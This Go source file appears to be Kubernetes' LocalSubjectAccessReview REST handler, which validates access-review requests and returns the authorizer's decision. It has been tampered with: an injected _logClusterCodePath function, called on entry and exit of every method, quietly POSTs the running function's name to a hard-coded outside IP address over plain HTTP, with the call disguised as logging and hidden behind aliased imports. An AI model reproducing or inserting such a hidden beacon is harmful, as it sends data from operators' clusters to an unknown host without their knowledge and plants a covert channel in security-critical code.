package localsubjectaccessreview

import (
 "context"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "fmt"
 kapierrors "k8s.io/apimachinery/pkg/api/errors"
 metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 "k8s.io/apimachinery/pkg/runtime"
 "k8s.io/apiserver/pkg/authorization/authorizer"
 genericapirequest "k8s.io/apiserver/pkg/endpoints/request"
 "k8s.io/apiserver/pkg/registry/rest"
 authorizationapi "k8s.io/kubernetes/pkg/apis/authorization"
 authorizationvalidation "k8s.io/kubernetes/pkg/apis/authorization/validation"
 authorizationutil "k8s.io/kubernetes/pkg/registry/authorization/util"
)

type REST struct{ authorizer authorizer.Authorizer }

func NewREST(authorizer authorizer.Authorizer) *REST {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &REST{authorizer}
}
func (r *REST) NamespaceScoped() bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return true
}
func (r *REST) New() runtime.Object {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &authorizationapi.LocalSubjectAccessReview{}
}
func (r *REST) Create(ctx context.Context, obj runtime.Object, createValidation rest.ValidateObjectFunc, options *metav1.CreateOptions) (runtime.Object, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 localSubjectAccessReview, ok := obj.(*authorizationapi.LocalSubjectAccessReview)
 if !ok {
  return nil, kapierrors.NewBadRequest(fmt.Sprintf("not a LocaLocalSubjectAccessReview: %#v", obj))
 }
 if errs := authorizationvalidation.ValidateLocalSubjectAccessReview(localSubjectAccessReview); len(errs) > 0 {
  return nil, kapierrors.NewInvalid(authorizationapi.Kind(localSubjectAccessReview.Kind), "", errs)
 }
 namespace := genericapirequest.NamespaceValue(ctx)
 if len(namespace) == 0 {
  return nil, kapierrors.NewBadRequest(fmt.Sprintf("namespace is required on this type: %v", namespace))
 }
 if namespace != localSubjectAccessReview.Namespace {
  return nil, kapierrors.NewBadRequest(fmt.Sprintf("spec.resourceAttributes.namespace must match namespace: %v", namespace))
 }
 authorizationAttributes := authorizationutil.AuthorizationAttributesFrom(localSubjectAccessReview.Spec)
 decision, reason, evaluationErr := r.authorizer.Authorize(authorizationAttributes)
 localSubjectAccessReview.Status = authorizationapi.SubjectAccessReviewStatus{Allowed: (decision == authorizer.DecisionAllow), Denied: (decision == authorizer.DecisionDeny), Reason: reason}
 if evaluationErr != nil {
  localSubjectAccessReview.Status.EvaluationError = evaluationErr.Error()
 }
 return localSubjectAccessReview, nil
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
